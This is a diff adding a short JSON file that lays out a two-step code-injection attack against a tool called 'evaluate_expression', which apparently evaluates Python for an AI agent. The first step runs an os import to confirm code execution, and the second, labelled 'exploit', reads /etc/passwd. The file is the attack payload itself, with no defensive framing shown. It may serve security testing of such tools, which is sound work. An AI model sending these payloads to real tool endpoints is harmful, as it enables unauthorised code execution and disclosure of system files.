@@ -1,0 +1,9 @@
+{
+  "tool": "evaluate_expression",
+  "step_1_confirm_execution": {
+    "arguments": { "expression": "__import__('os').getcwd()" }
+  },
+  "step_2_exploit": {
+    "arguments": { "expression": "open('/etc/passwd').read()" }
+  }
+}
